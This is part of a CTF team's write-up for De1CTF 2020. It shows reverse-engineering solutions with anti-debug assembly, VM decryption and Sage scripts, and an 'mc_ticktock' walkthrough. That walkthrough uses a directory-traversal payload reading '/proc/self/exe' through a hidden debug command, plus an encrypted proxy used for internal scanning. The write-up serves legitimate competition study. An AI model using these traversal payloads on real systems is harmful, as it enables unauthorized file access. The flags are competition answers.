class="line">41</span><br></pre></td><td class="code"><pre><span class="line">_asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax, _PE1</span><br><span class="line">        push eax</span><br><span class="line">        push fs : [0]</span><br><span class="line">        mov fs : [0] , esp</span><br><span class="line">        xor ecx, ecx</span><br><span class="line">        div ecx</span><br><span class="line">        retn</span><br><span class="line">        _PE1 :</span><br><span class="line">        mov esp, [esp + 8]</span><br><span class="line">            mov eax, fs : [0]</span><br><span class="line">            mov eax, [eax]</span><br><span class="line">            mov eax, [eax]</span><br><span class="line">            mov fs : [0] , eax</span><br><span class="line">            add esp, 8</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> _asm</span><br><span class="line">    &#123;</span><br><span class="line">        jz _P2</span><br><span class="line">        jnz _P2</span><br><span class="line">        _P1 :</span><br><span class="line">        __emit 0xE8</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">_asm</span><br><span class="line">    &#123;</span><br><span class="line">        call _P1</span><br><span class="line">        _P1 :</span><br><span class="line">        add[esp], 5</span><br><span class="line">            retn</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">_asm</span><br><span class="line">    &#123;</span><br><span class="line">        xor eax, eax</span><br><span class="line">        add eax, 2</span><br><span class="line">        ret 0xff</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>3.The 20 characters in flag packaging were divided into 10 groups for base58 encoding</p>
<p>The machine code is too long. I'll put a pseudo code here</p>
<p>It is important to note that although the table is 64-bit long, the algorithm used is base58, not base64</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">table = '0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/='</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">10</span>;++i)&#123;</span><br><span class="line">  reg = (memSpace[<span class="number">0x20</span>+i*<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)+memspace(<span class="number">0x21</span>+i*<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">3</span>;j&gt;<span class="number">0</span>;--j)&#123;</span><br><span class="line">    memspace[<span class="number">0x39</span>+j+i*<span class="number">3</span>] = table[reg%<span class="number">58</span>];</span><br><span class="line">    reg /= <span class="number">58</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>4.Packet encryption</p>
<p>Then do not know how, whim, made a round of encryption, grouping.</p>
<p>Modular addition, modular subtraction, or xor are all reversible.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(int i = <span class="number">0</span>,i&lt;<span class="number">30</span>,i+=<span class="number">3</span>)&#123;</span><br><span class="line">  memSpace[<span class="number">0x40</span>+i+<span class="number">1</span>] = memSpace[<span class="number">0x40</span>+i+<span class="number">1</span>]+memSpace[<span class="number">0x40</span>+i+<span class="number">0</span>];</span><br><span class="line">  memSpace[<span class="number">0x40</span>+i+<span class="number">2</span>] = memSpace[<span class="number">0x40</span>+i+<span class="number">2</span>]-memSpace[<span class="number">0x40</span>+i+<span class="number">1</span>];</span><br><span class="line">  memSpace[<span class="number">0x40</span>+i+<span class="number">0</span>] = memSpace[<span class="number">0x40</span>+i+<span class="number">0</span>]^memSpace[<span class="number">0x40</span>+i+<span class="number">2</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>5.The encrypted results are detected</p>
<p>The reason for not putting machine code is the same as above.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">enc_flag = [<span class="number">0x7a</span>,<span class="number">0x19</span>,<span class="number">0x4f</span>,<span class="number">0x6e</span>,<span class="number">0xe</span>,<span class="number">0x56</span>,<span class="number">0xaf</span>,<span class="number">0x1f</span>,<span class="number">0x98</span>,<span class="number">0x58</span>,<span class="number">0xe</span>,<span class="number">0x60</span>,<span class="number">0xbd</span>,<span class="number">0x42</span>,<span class="number">0x8a</span>,<span class="number">0xa2</span>,<span class="number">0x20</span>,<span class="number">0x97</span>,<span class="number">0xb0</span>,<span class="number">0x3d</span>,<span class="number">0x87</span>,<span class="number">0xa0</span>,<span class="number">0x22</span>,<span class="number">0x95</span>,<span class="number">0x79</span>,<span class="number">0xf9</span>,<span class="number">0x41</span>,<span class="number">0x54</span>,<span class="number">0xc</span>,<span class="number">0x6d</span>]</span><br><span class="line"><span class="keyword">for</span> i in range(len(enc_flag)):</span><br><span class="line">    <span class="keyword">if</span> enc_flag[i]!=memSpace[i]:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p>6.The virtual machine finishes running and returns true</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0xab</span>:<span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
<h3><span id="exppy">exp.py</span></h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">enc_flag = [<span class="number">0x7a</span>,<span class="number">0x19</span>,<span class="number">0x4f</span>,<span class="number">0x6e</span>,<span class="number">0xe</span>,<span class="number">0x56</span>,<span class="number">0xaf</span>,<span class="number">0x1f</span>,<span class="number">0x98</span>,<span class="number">0x58</span>,<span class="number">0xe</span>,<span class="number">0x60</span>,<span class="number">0xbd</span>,<span class="number">0x42</span>,<span class="number">0x8a</span>,<span class="number">0xa2</span>,<span class="number">0x20</span>,<span class="number">0x97</span>,<span class="number">0xb0</span>,<span class="number">0x3d</span>,<span class="number">0x87</span>,<span class="number">0xa0</span>,<span class="number">0x22</span>,<span class="number">0x95</span>,<span class="number">0x79</span>,<span class="number">0xf9</span>,<span class="number">0x41</span>,<span class="number">0x54</span>,<span class="number">0xc</span>,<span class="number">0x6d</span>]</span><br><span class="line">table = <span class="string">'0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/='</span></span><br><span class="line">enc = [<span class="keyword">None</span>]*<span class="number">30</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(i!=<span class="number">30</span>):</span><br><span class="line">  enc_flag[i+<span class="number">0</span>] = enc_flag[i+<span class="number">2</span>]^enc_flag[i+<span class="number">0</span>]</span><br><span class="line">  enc_flag[i+<span class="number">2</span>] = (enc_flag[i+<span class="number">2</span>]-enc_flag[i+<span class="number">1</span>]+<span class="number">0x100</span>)%<span class="number">0x100</span></span><br><span class="line">  enc_flag[i+<span class="number">1</span>] = (enc_flag[i]+enc_flag[i+<span class="number">1</span>]+<span class="number">0x100</span>)%<span class="number">0x100</span></span><br><span class="line">  i+=<span class="number">3</span></span><br><span class="line"></span><br><span class="line">temp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc_flag)):</span><br><span class="line">  temp += chr(enc_flag[i])</span><br><span class="line">enc_flag = temp</span><br><span class="line">print(enc_flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc_flag)):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> range(len(table)):</span><br><span class="line">    <span class="keyword">if</span> ord(enc_flag[i])==ord(table[j]):</span><br><span class="line">      enc[i] = j</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"de1ctf&#123;"</span>,end = <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">  temp = enc[i*<span class="number">3</span>]*<span class="number">58</span>*<span class="number">58</span>+enc[i*<span class="number">3</span>+<span class="number">1</span>]*<span class="number">58</span>+enc[i*<span class="number">3</span>+<span class="number">2</span>]</span><br><span class="line">  print(<span class="string">"&#123;&#125;&#123;&#125;"</span>.format(chr(temp//<span class="number">256</span>),chr(temp%<span class="number">256</span>)),end = <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"&#125;"</span>,end = <span class="string">''</span>)</span><br></pre></td></tr></table></figure>
<h2><span id="little-elves">little elves</span></h2>
<p>reference to <a href="https://github.com/arjun024/tiny-elf" target="_blank" rel="noopener">tiny-elf</a></p>
<p>I reference this elf that I can write some assembly code and run it directly. Another intention is to learn something about the ELF format.</p>
<p>In this case, the program header is at the offset of 4 in the file. And the third member of the program header is the address of the segment. So the base address is 0x888000. If you can't get this point, you may have a little trouble in later analysis.</p>
<p>I add some junk code and it is not very hard to remove them. The main code is a big unrolling loop, every part is similar.</p>
<p>The algorithm is some basis abstract algebra, the matrix multiple over Finite Field of size 2 with the modulus x^8 + x^5 + x^4 + x^3 + 1.</p>
<p>Use sage to solve it easily, and the z3-solver doesn't work.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">flag = <span class="string">"De1CTF&#123;01ab211f-589b-40b7-9ee4-4243f541fc40&#125;"</span></span><br><span class="line">SIZE = len(flag)</span><br><span class="line">res = [<span class="number">200</span>, <span class="number">201</span>, <span class="number">204</span>, <span class="number">116</span>, <span class="number">124</span>, <span class="number">94</span>, <span class="number">129</span>, <span class="number">127</span>, <span class="number">211</span>, <span class="number">85</span>, <span class="number">61</span>, <span class="number">154</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">19</span>, <span class="number">134</span>, <span class="number">121</span>, <span class="number">70</span>, <span class="number">100</span>, <span class="number">219</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">93</span>, <span class="number">252</span>, <span class="number">152</span>, <span class="number">87</span>, <span class="number">32</span>, <span class="number">171</span>, <span class="number">228</span>, <span class="number">156</span>, <span class="number">43</span>, <span class="number">98</span>, <span class="number">203</span>, <span class="number">2</span>, <span class="number">24</span>, <span class="number">63</span>, <span class="number">215</span>, <span class="number">186</span>, <span class="number">201</span>, <span class="number">128</span>, <span class="number">103</span>, <span class="number">52</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">i2x</span><span class="params">(num)</span>:</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> num!=<span class="number">0</span>:</span><br><span class="line">        res += (num&amp;<span class="number">1</span>) * (x^i)</span><br><span class="line">        num &gt;&gt;= <span class="number">1</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">i2y</span><span class="params">(num)</span>:</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> num!=<span class="number">0</span>:</span><br><span class="line">        res += (num&amp;<span class="number">1</span>) * (y^i)</span><br><span class="line">        num &gt;&gt;= <span class="number">1</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">y2i</span><span class="params">(r)</span>:</span></span><br><span class="line">    tmp = r.list()</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tmp[::<span class="number">-1</span>]:</span><br><span class="line">        res &lt;&lt;= <span class="number">1</span></span><br><span class="line">        res += int(i)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vi2y</span><span class="params">(v)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">        res.append(i2y(i))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vy2i</span><span class="params">(v)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">        res.append(y2i(i))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mi2y</span><span class="params">(m)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        res.append(vi2y(i))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my2i</span><span class="params">(m)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        res.append(vy2i(i))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(GF(<span class="number">2</span>), <span class="string">'x'</span>)</span><br><span class="line">S.&lt;y&gt; = QuotientRing(R, R.ideal(i2x(<span class="number">313</span>)))</span><br><span class="line"></span><br><span class="line">M = MatrixSpace(S, SIZE, SIZE)</span><br><span class="line">V = VectorSpace(S, SIZE)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genM</span><span class="params">()</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(SIZE):</span><br><span class="line">        tmp = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(SIZE):</span><br><span class="line">            tmp.append(random.randint(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">        res.append(tmp)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">A = <span class="comment"># matrix here ...</span></span><br><span class="line"><span class="comment">#A = genM()</span></span><br><span class="line">AM = M(mi2y(A))</span><br><span class="line">v = V(vi2y(res))</span><br><span class="line">f = vy2i(AM.solve_right(v))</span><br><span class="line">f = <span class="string">""</span>.join(map(chr, f))</span><br><span class="line">print(f)</span><br></pre></td></tr></table></figure>
<h2><span id="mc_ticktock">mc_ticktock</span></h2>
<p>Files: <a href="https://pastebin.com/YtCdrzCd" target="_blank" rel="noopener">exp.go</a> <a href="https://pastebin.com/rWAPYaRp" target="_blank" rel="noopener">types.go</a> <a href="https://pastebin.com/CYtng7mR" target="_blank" rel="noopener">crypt.go</a></p>
<p>Previously on the challenge, we got a hidden command <code>/MC2020-DEBUG-VIEW:-)</code>. We could read player's log file by their's UUID. Of course, it's a classical directory traversal attack here to read any file on the challenge environment.</p>
<p>Let's read the service binary file <code>../../../../../../../proc/self/exe</code>, and reverse it. (<code>go run exp.go types.go crypt.go -s1</code>)</p>
<p>In <code>main_main</code> function, there is some code like:</p>
<figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_, err := os.Stat(<span class="string">"webserver"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatal(<span class="string">"webserver not found"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Go on, and read the web service binary file <code>../../../../../../../proc/self/cwd/webserver</code>, and reverse it. (<code>go run exp.go types.go crypt.go -s2</code>)</p>
<p>You will found three hidden functions.</p>
<ol type="1">
<li><code>http://:80/ticktock?text={text}</code></li>
</ol>
<p>It will have a Modified-SM4 encryption of the {text}, and compare the cipher-text with the prefix one. If they match, you will have 20 minutes (One day-night cycle in Minecraft World) to access function two and three. In the meantime, the plain text contains the flag of this challenge.</p>
<figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">KEY := Sha256([]<span class="keyword">byte</span>(<span class="string">"de1ctf-mc2020"</span>))</span><br><span class="line">NONCE := Sha256([]<span class="keyword">byte</span>(<span class="string">"de1ta-team"</span>))[:<span class="number">24</span>]</span><br><span class="line">c, _ := crypt.NewCipher(KEY[:<span class="number">16</span>])</span><br><span class="line">s := cipher.NewCFBEncrypter(c, NONCE[:<span class="number">16</span>])</span><br><span class="line">plain := []<span class="keyword">byte</span>(<span class="string">"example plain text"</span>)</span><br><span class="line">buff := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(plain))</span><br><span class="line">s.XORKeyStream(buff, plain)</span><br></pre></td></tr></table></figure>
<ol start="2" type="1">
<li><code>http://:80/webproxy</code></li>
</ol>
<p>It's a custom proxy service. You can use it to make HTTP request or do a TCP scanning. Remaining three challenges <code>mc_realworld</code> &amp; <code>mc_logclient</code> &amp; <code>mc_noisemap</code> need this proxy to access the web service.</p>
<p>How to use? Make a POST request to this URL. The POST body should be encrypted using <code>chacha20</code> cipher.</p>
<figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">KEY := Sha256([]<span class="keyword">byte</span>(<span class="string">"de1ctf-mc2020"</span>))</span><br><span class="line">NONCE := Sha256([]<span class="keyword">byte</span>(<span class="string">"de1ta-team"</span>))[:<span class="number">24</span>]</span><br><span class="line">cipher, _ := chacha20.NewUnauthenticatedCipher(KEY[:], NONCE[:])</span><br><span class="line">body := []<span class="keyword">byte</span>(<span class="string">"127.0.0.1:80|GET /assets/ HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n"</span>)</span><br><span class="line">buff := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(body))</span><br><span class="line">cipher.XORKeyStream(buff, body)</span><br></pre></td></tr></table></figure>
<ol start="3" type="1">
<li><code>tcp://:8080/</code></li>
</ol>
<p>It's a custom TCP proxy service to access the game service of challenge <code>mc_realworld</code>. Inbound traffic and outbound traffic are both using <code>chacha20</code> cipher to encrypt which mentioned above.</p>
<p>To get the flag, try <code>go run exp.go types.go crypt.go -s3</code>.</p>
<p><code>De1CTF{t1Ck-t0ck_Tlck-1ocK_MC2O20_:)SM4}</code></p>

    </div>

    

    
        <div class="post-tags">
            <i class="fa fa-tags" aria-hidden="true"></i>
            <a href="/tags/ctf/">#ctf</a> <a href="/tags/re/">#re</a> <a href="/tags/web/">#web</a> <a href="/tags/crypto/">#crypto</a> <a href="/tags/pwn/">#pwn</a> <a href="/tags/misc/">#misc</a> <a href="/tags/writeup/">#writeup</a> <a href="/tags/xctf/">#xctf</a>
        </div>
    

    <!-- Comments -->
    

</div>
        </section>

    </div>
</div>


</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    De1ta-Team: De1iver the tea
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2099/05/22/Write-ups-for-CTFs/">Write ups for CTFs</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2020/05/06/de1ctf2020 Writeup/">De1CTF 2020 Writeup</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2020/03/10/XCTF<ZHANYI>-2020/">XCTF战疫 2020 Writeup</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/08/19/SUCTF2019/">SUCTF 2019 Writeup</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/De1ta-team">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    <li class="list-inline-item">
                        <a href="/atom.xml">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @De1ta-Team. All right reserved
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</body>

</html>